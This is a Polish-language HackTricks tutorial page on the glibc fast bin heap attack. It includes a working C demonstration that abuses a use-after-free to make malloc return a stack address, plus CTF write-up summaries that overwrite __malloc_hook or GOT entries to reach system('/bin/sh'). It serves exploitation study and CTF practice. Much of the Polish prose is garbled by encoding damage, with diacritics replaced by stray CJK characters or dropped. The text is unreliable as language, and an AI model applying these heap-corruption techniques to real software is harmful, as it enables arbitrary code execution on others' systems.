# Fast Bin Attack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Podstawowe informacje

Aby uzyska wicej informacji na temat tego, czym jest fast bin, sprawd藕 t stron:

{% content-ref url="bins-and-memory-allocations.md" %}
[bins-and-memory-allocations.md](bins-and-memory-allocations.md)
{% endcontent-ref %}

Poniewa偶 fast bin jest list jednokierunkow, istnieje znacznie mniej zabezpiecze ni偶 w innych binach, a **zmodyfikowanie adresu w zwolnionym kawaku fast bin** wystarczy, aby m贸c **p贸藕niej przydzieli kawaek w dowolnym adresie pamici**.

Podsumowujc:

{% code overflow="wrap" %}
```c
ptr0 = malloc(0x20);
ptr1 = malloc(0x20);

// Put them in fast bin (suppose tcache is full)
free(ptr0)
free(ptr1)

// Use-after-free
// Modify the address where the free chunk of ptr1 is pointing
*ptr1 = (unsigned long)((char *)&<address>);

ptr2 = malloc(0x20); // This will get ptr1
ptr3 = malloc(0x20); // This will get a chunk in the <address> which could be abuse to overwrite arbitrary content inside of it
```
{% endcode %}

Mo偶esz znale藕 peny przykad w bardzo dobrze wyjanionym kodzie z [https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html):
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
puts("Today we will be discussing a fastbin attack.");
puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

puts("Let's start, we will allocate three chunks of size 0x30\n");
unsigned long *ptr0, *ptr1, *ptr2;

ptr0 = malloc(0x30);
ptr1 = malloc(0x30);
ptr2 = malloc(0x30);

printf("Chunk 0: %p\n", ptr0);
printf("Chunk 1: %p\n", ptr1);
printf("Chunk 2: %p\n\n", ptr2);


printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

int stackVar = 0x55;

printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);

printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

char *data0 = "00000000";
char *data1 = "11111111";
char *data2 = "22222222";

memcpy(ptr0, data0, 0x8);
memcpy(ptr1, data1, 0x8);
memcpy(ptr2, data2, 0x8);

printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

printf("Chunk 0: %s\n", (char *)ptr0);
printf("Chunk 1: %s\n", (char *)ptr1);
printf("Chunk 2: %s\n\n", (char *)ptr2);

printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

free(ptr0);
free(ptr1);
free(ptr2);

printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

*ptr1 = (unsigned long)((char *)&stackVar);

printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

unsigned long *ptr3, *ptr4, *ptr5;

ptr3 = malloc(0x30);
ptr4 = malloc(0x30);
ptr5 = malloc(0x30);

printf("Chunk 3: %p\n", ptr3);
printf("Chunk 4: %p\n", ptr4);
printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);

printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}
```
{% hint style="danger" %}
Jeli mo偶liwe jest nadpisanie wartoci globalnej zmiennej **`global_max_fast`** du偶 liczb, pozwala to na generowanie kawak贸w fast bin o wikszych rozmiarach, co potencjalnie umo偶liwia przeprowadzenie atak贸w fast bin w scenariuszach, w kt贸rych wczeniej nie byo to mo偶liwe. Ta sytuacja jest przydatna w kontekcie [large bin attack](large-bin-attack.md) i [unsorted bin attack](unsorted-bin-attack.md).
{% endhint %}

## Przykady

* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html)**:**
* Mo偶liwe jest alokowanie kawak贸w, zwalnianie ich, odczytywanie ich zawartoci i wypenianie ich (z wykorzystaniem podatnoci na przepenienie).
* **Konsolidacja kawaka dla infoleak**: Technika polega zasadniczo na nadu偶ywaniu przepenienia, aby stworzy faszywy `prev_size`, tak aby jeden z poprzednich kawak贸w znalaz si w wikszym, wic podczas alokowania wikszego kawaka zawierajcego inny kawaek, mo偶liwe jest wydrukowanie jego danych i wyciek adresu do libc (`main_arena+88`).
* **Nadpisanie malloc hook**: W tym przypadku, nadu偶ywajc poprzedniej sytuacji z nakadaniem si, mo偶liwe byo posiadanie 2 kawak贸w, kt贸re wskazyway na t sam pami. Dlatego zwolnienie obu (zwalniajc inny kawaek pomidzy, aby unikn ochrony) pozwolio na posiadanie tego samego kawaka w fast bin 2 razy. Nastpnie mo偶liwe byo ponowne alokowanie go, nadpisanie adresu do nastpnego kawaka, aby wskazywa troch przed `__malloc_hook` (tak aby wskazywa na liczb cakowit, kt贸r malloc uwa偶a za wolny rozmiar - kolejny bypass), ponowne alokowanie go, a nastpnie alokowanie innego kawaka, kt贸ry otrzyma adres do malloc hooks.\
Na koniec **one gadget** zosta tam zapisany.
* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html)**:**
* Istnieje przepenienie sterty i u偶ycie po zwolnieniu oraz podw贸jne zwolnienie, poniewa偶 gdy kawaek jest zwalniany, mo偶liwe jest ponowne u偶ycie i ponowne zwolnienie wska藕nik贸w.
* **Libc info leak**: Wystarczy zwolni kilka kawak贸w, a otrzymaj one wska藕nik do czci lokalizacji g贸wnej areny. Poniewa偶 mo偶na ponownie u偶ywa zwolnionych wska藕nik贸w, wystarczy odczyta ten adres.
* **Fast bin attack**: Wszystkie wska藕niki do alokacji s przechowywane w tablicy, wic mo偶emy zwolni kilka kawak贸w fast bin, a w ostatnim nadpisa adres, aby wskazywa troch przed t tablic wska藕nik贸w. Nastpnie alokujemy kilka kawak贸w o tym samym rozmiarze i najpierw otrzymamy ten legalny, a potem faszywy zawierajcy tablic wska藕nik贸w. Mo偶emy teraz nadpisa te wska藕niki alokacji, aby adres GOT `free` wskazywa na `system`, a nastpnie zapisa `"/bin/sh"` w kawaku 1, aby nastpnie wywoa `free(chunk1)`, co zamiast tego wykona `system("/bin/sh")`.
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html)
* Inny przykad nadu偶ywania przepenienia jednego bajtu do konsolidacji kawak贸w w nieposortowanej binie i uzyskania wycieku informacji libc, a nastpnie przeprowadzenia ataku fast bin w celu nadpisania malloc hook adresem one gadget.
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html)
* Po wycieku informacji nadu偶ywajc nieposortowanej biny z UAF, aby wycieka adres libc i adres PIE, exploit tego CTF u偶y ataku fast bin do alokowania kawaka w miejscu, gdzie znajdoway si wska藕niki do kontrolowanych kawak贸w, wic mo偶liwe byo nadpisanie niekt贸rych wska藕nik贸w, aby zapisa one gadget w GOT.
* Mo偶esz znale藕 atak Fast Bin nadu偶yty przez atak nieposortowanej biny:
* Zauwa偶, 偶e przed przeprowadzeniem atak贸w fast bin powszechnie nadu偶ywa si list zwolnie, aby wycieka adresy libc/heap (gdy jest to potrzebne).
* [**Robot Factory. BlackHat MEA CTF 2022**](https://7rocky.github.io/en/ctf/other/blackhat-ctf/robot-factory/)
* Mo偶emy alokowa tylko kawaki o rozmiarze wikszym ni偶 `0x100`.
* Nadpisz `global_max_fast` u偶ywajc ataku Unsorted Bin (dziaa 1/16 razy z powodu ASLR, poniewa偶 musimy zmodyfikowa 12 bit贸w, ale musimy zmodyfikowa 16 bit贸w).
* Atak Fast Bin w celu modyfikacji globalnej tablicy kawak贸w. Daje to arbitraln prymityw odczytu/zapisu, co pozwala na modyfikacj GOT i ustawienie niekt贸rych funkcji, aby wskazyway na `system`.

{% content-ref url="unsorted-bin-attack.md" %}
[unsorted-bin-attack.md](unsorted-bin-attack.md)
{% endcontent-ref %}

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
